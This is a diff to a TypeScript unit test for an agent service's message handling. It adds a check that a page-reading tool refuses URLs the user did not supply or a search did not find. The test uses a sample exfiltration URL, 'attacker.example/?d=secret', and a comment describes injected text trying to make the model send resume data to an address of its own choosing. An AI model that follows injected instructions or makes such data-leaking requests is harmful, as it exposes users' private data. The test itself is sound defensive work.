@@ -376,7 +376,7 @@ describe("agentService.messages.send", () => {
 		vi.mocked(streamToEventIterator).mockReturnValue("iterator" as never);
 
 		const { agentService } = await import("./service");
-		const send = async (context?: { document: boolean; posting: boolean }) => {
+		const send = async (context?: { document: boolean; posting: boolean }, text = "Hi") => {
 			const privateHistory = {
 				...persistedMessage,
 				id: "old-message",
@@ -406,7 +406,7 @@ describe("agentService.messages.send", () => {
 				message: {
 					id: "ui-message-1",
 					role: "user",
-					parts: [{ type: "text", text: "Hi" }],
+					parts: [{ type: "text", text }],
 					// oxlint-disable-next-line typescript/no-explicit-any -- minimal fixture for unit test
 				} as any,
 				...(context ? { context } : {}),
@@ -450,6 +450,14 @@ describe("agentService.messages.send", () => {
 			regions: ["DE", "FR"],
 		});
 
+		// A document thread reads only pages the user linked or a search found, so injected text can't make the model
+		// request an address of its own with resume data in it.
+		const { readPage } = await import("../web-access/service");
+		await expect(
+			vi.mocked(buildAgentTools).mock.calls[0]?.[0].handlers.readPage("https://attacker.example/?d=secret", signal),
+		).rejects.toThrow("Read only retrieved URLs");
+		expect(readPage).not.toHaveBeenCalled();
+
 		// The server's SearXNG gives the assistant web search without a web connection.
 		expect(vi.mocked(buildAgentTools).mock.calls[0]?.[0]).toMatchObject({ externalSearch: false });
 		const { webAccessService } = await import("../web-access/credentials");
@@ -457,6 +465,13 @@ describe("agentService.messages.send", () => {
 		await send();
 		expect(webAccessService.canSearch).toHaveBeenLastCalledWith(false);
 		expect(vi.mocked(buildAgentTools).mock.calls[2]?.[0]).toMatchObject({ externalSearch: true });
+
+		// A link the user wrote still reads, however the sentence around it ends or the model spells it.
+		await send(undefined, "Tailor it to https://jobs.example.com/role-42.");
+		vi.mocked(readPage).mockResolvedValueOnce({ requestedUrl: "https://jobs.example.com/role-42/" } as never);
+		await expect(
+			vi.mocked(buildAgentTools).mock.calls.at(-1)?.[0].handlers.readPage("https://JOBS.example.com/role-42/", signal),
+		).resolves.toMatchObject({ requestedUrl: "https://jobs.example.com/role-42/" });
 	});
 
 	it("persists canonical attachment UI parts, links selected attachments, and appends server-read model parts", async () => {
@@ -1064,8 +1079,8 @@ describe("agentService.attachments.create", () => {
 			agentService.attachments.create(upload),
 		]);
 		await vi.waitFor(() => expect(storageServiceMock.write).toHaveBeenCalledTimes(1));
-		// The first upload's two quota reads (unsent count, thread bytes); the second waits on the lock.
-		expect(quotaRead).toHaveBeenCalledTimes(2);
+		// The first upload's three quota reads (unsent count, thread bytes, account bytes); the second waits on the lock.
+		expect(quotaRead).toHaveBeenCalledTimes(3);
 		storageWrite.resolve();
 		const settled = await results;
 		expect(settled[0]?.status).toBe("fulfilled");
